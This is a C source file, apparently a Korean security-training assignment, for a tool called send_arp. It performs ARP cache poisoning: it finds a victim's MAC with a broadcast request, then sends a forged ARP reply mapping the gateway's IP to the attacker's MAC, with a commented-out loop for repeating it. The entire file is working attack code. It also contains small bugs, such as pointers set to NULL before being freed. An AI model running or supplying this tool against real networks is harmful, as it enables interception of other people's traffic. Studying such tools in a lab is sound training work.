/*
	send_arp <interface> <sender ip> <target ip>
*/
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <pcap.h>
#include <malloc.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define ETHERTYPE_ARP 0x0806

// Define Header, 고정된 값은 그냥 대입하였습니다.
typedef struct ARP_Header {
	// Ethernet Header
	uint8_t dst_mac[6];			//Destination Mac : 6byte
	uint8_t src_mac[6];                 	//Source Mac : 6byte
	uint16_t type = 0x0608;	    	    	//Type : ARP 2byte (0x0806, 08 06)

	// ARP Header
	uint16_t hardware_type = 0x0100;	// hardware type : 2byte(Ethernet, 1, 00 01)
	uint16_t protocol_type = 0x0008;	// Protocol Type : IPv4 2byte (0x0800, 08 00)
	uint8_t hardware_len = 0x06;		// hardware size : 1byte (6, 06)
	uint8_t protocol_len = 0x04;		// protocol size : 1byte (4, 04)
	uint16_t opcode;			// opcode : 1byte request (00 01) reply (00 02)
	uint8_t sender_ha_add[6];		// sender mac : 6byte
	uint8_t sender_pro_add[4];		// sender ip : 4byte
	uint8_t target_ha_add[6];		// target mac : 6byte
	uint8_t target_pro_add[4];		// target ip : 4byte
}ARP_Header;

// need 4 argvs
void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp eth0 192.168.10.2 192.168.10.1\n");
}

// print creator
void start_msg(char *track, char *name){
	printf("[bob7][%s]send_arp[%s]\n", track, name);
}

// Get My IP Address
int GetIpAddress (const char *ifr, unsigned char *output_ip) {
	int sock_ip;
	struct ifreq ifrq;
	struct sockaddr_in *sin;

	sock_ip = socket(AF_INET, SOCK_DGRAM, 0);
	strcpy(ifrq.ifr_name, ifr);

	if (ioctl(sock_ip, SIOCGIFADDR, &ifrq) < 0) {
		perror( "ioctl() SIOCGIFADDR error");
		return -1;
	}

	sin = (struct sockaddr_in *)&ifrq.ifr_addr;
	memcpy (output_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

	close(sock_ip);

	return 4;
}

// Get My ARP Address
int GetMacAddress (const char *ifr, unsigned char *output_mac) {
	int sock_arp;
	unsigned char *mac = NULL;
	struct ifreq ifra;
	memset(&ifra, 0x00, sizeof(ifra));

	sock_arp = socket(AF_UNIX, SOCK_DGRAM, 0);
	strcpy(ifra.ifr_name, ifr);			// Copy interface , eth0

	// Bring MAC Address
	if (sock_arp<0) {
		perror("socket ");
		return -1;
	}
	if (ioctl(sock_arp, SIOCGIFHWADDR, &ifra)<0) {
		perror("ioctl Error");
		return -1;
	}

	// Print MAC Address
	mac = (unsigned char*)(ifra.ifr_hwaddr.sa_data);
	output_mac[0] = mac[0];
	output_mac[1] = mac[1];
	output_mac[2] = mac[2];
	output_mac[3] = mac[3];
	output_mac[4] = mac[4];
	output_mac[5] = mac[5];

	// close sockets
	close(sock_arp);

	return 4;
}

// Packet Making
void packet_collect(const uint8_t* packet, ARP_Header arp){
	memcpy((uint8_t*)packet, arp.dst_mac,6);
	memcpy((uint8_t*)packet+6, arp.src_mac,22);
	memcpy((uint8_t*)packet+28, arp.sender_pro_add,4);
	memcpy((uint8_t*)packet+32, arp.target_ha_add,6);
	memcpy((uint8_t*)packet+38, arp.target_pro_add,4);
}

int main(int argc, char* argv[]) {
	// need 4 argvs
	if (argc != 4) {
		usage();
		return -1;
	}

	// Info Creator
	char track[] = "컨설팅";
	char name[] = "김만수";
	start_msg(track, name);

	// Network Device, Sender_IP, Target_IP
	char* dev = argv[1];
	char* sender_ip = argv[2];
	char* target_ip = argv[3];

	// Ethernet, ARP Header Pointer
	ARP_Header ARP;

	// For Bring My ARP & IP
	uint8_t my_mac[6] = {0,};	// My Mac Variable
	uint8_t my_ip[4] = {0,};	// My IP Variable

	// Error ?
	char errbuf[PCAP_ERRBUF_SIZE];

	// Find Packet session, no session -> return false
	// ARP Requst, ARP Reply 수신, ARP Fake Reply 이렇게 3개가 하나로 통합되는 지는 모르겠습니다.. 컨펌 부탁드립니다.
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle2 == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	pcap_t* handle3 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle3 == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	// Print interface
	printf("Interface : %s\n", dev);

	// Bring IP Address
	if (GetIpAddress(dev, my_ip) > 0) {
		printf("IP = %d.%d.%d.%d\n", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
	}
	else{
		printf("Restart ! \n");
		return 0;
	}

	// Bring MAC Address
	if(GetMacAddress(dev, my_mac) > 0){
		printf("MAC = %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
	}
	else{
		printf("Restart ! \n");
		return 0;
	}

	// Makke ARP Request Broadcast
	/*================================================================================*/
	struct pcap_pkthdr* header;							// pcap header
	const uint8_t* packet;								// real packet
	ARP_Header send_arp_packet_broadcast;

	packet = (const uint8_t*)malloc(42);

	send_arp_packet_broadcast.opcode = 0x0100;					// ARP Request
	memcpy(send_arp_packet_broadcast.src_mac, my_mac,6);				// Attacker Mac
	memcpy(send_arp_packet_broadcast.dst_mac, "\xff\xff\xff\xff\xff\xff",6);	// Broadcast Mac
	memcpy(send_arp_packet_broadcast.sender_ha_add, my_mac, 6);			// Attacker Mac
	memcpy(send_arp_packet_broadcast.target_ha_add, "\x00\x00\x00\x00\x00\x00",6);	// *I want to Victim Mac*
	memcpy(send_arp_packet_broadcast.sender_pro_add, my_ip, 4);			// Attacker IP
	inet_pton(AF_INET, sender_ip, send_arp_packet_broadcast.target_pro_add);	// Victim IP

	packet_collect(packet, send_arp_packet_broadcast);				// Packet Making
	pcap_sendpacket(handle, packet, 42);						// Send Packet!!!

	packet = NULL;
	free((void *)packet);								// Malloc Free
	/*================================================================================*/


	// Request ARP Packet!
	/*================================================================================*/
	ARP_Header *arp_recv;
	uint8_t victim_mac[6] = {0,};							// Victim Mac Variable

	while(true){
		struct pcap_pkthdr* header_recv;
		const uint8_t* packet_recv;
		int res = pcap_next_ex(handle2, &header_recv, &packet_recv);		// receive packet
		arp_recv = (ARP_Header*)packet_recv;
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		if (ntohs(arp_recv->type) == ETHERTYPE_ARP) {
			arp_recv = (ARP_Header*)packet_recv;

			if((memcmp((uint8_t *)arp_recv->sender_pro_add,(uint8_t *)&send_arp_packet_broadcast.target_pro_add, 4)) == 0){

				victim_mac[0] = arp_recv->sender_ha_add[0];
				victim_mac[1] = arp_recv->sender_ha_add[1];
				victim_mac[2] = arp_recv->sender_ha_add[2];
				victim_mac[3] = arp_recv->sender_ha_add[3];
				victim_mac[4] = arp_recv->sender_ha_add[4];
				victim_mac[5] = arp_recv->sender_ha_add[5];
				break;
			}
		}
	}
	pcap_close(handle2);
	/*================================================================================*/


	// Fake Packet!
	/*================================================================================*/
	ARP_Header send_arp_packet_fake;

	struct pcap_pkthdr* header_fake;					// pcap header
	const uint8_t* packet_fake;						// real packet

	packet_fake = (const uint8_t*)malloc(42);

	send_arp_packet_fake.opcode = 0x0200;					// ARP_REPLY
	memcpy(send_arp_packet_fake.src_mac, my_mac,6);				// Attacker Mac			=> my_mac
	memcpy(send_arp_packet_fake.dst_mac, victim_mac,6);			// Victim Mac			=> *Find!!*
	memcpy(send_arp_packet_fake.sender_ha_add, my_mac, 6);			// Attacker Mac			=> my_mac
	memcpy(send_arp_packet_fake.target_ha_add, victim_mac,6);		// Victim Mac			=> *Find!!*

	inet_pton(AF_INET, target_ip, send_arp_packet_fake.sender_pro_add);	// Target(=Gateway) IP	=> Target_IP(argv[3])
	inet_pton(AF_INET, sender_ip, send_arp_packet_fake.target_pro_add);	// Victim IP			=> Sender_IP(argv[2])

	packet_collect(packet_fake, send_arp_packet_fake);

	// If you need to repeat several times, uncomment it.
	//while(true){
		pcap_sendpacket(handle3, packet_fake, 42);
		//sleep(1);	 	// 1 second delay
	//}

	packet_fake = NULL;
	free((void *)packet_fake);	// Malloc Free

	/*================================================================================*/

	return 0;
}
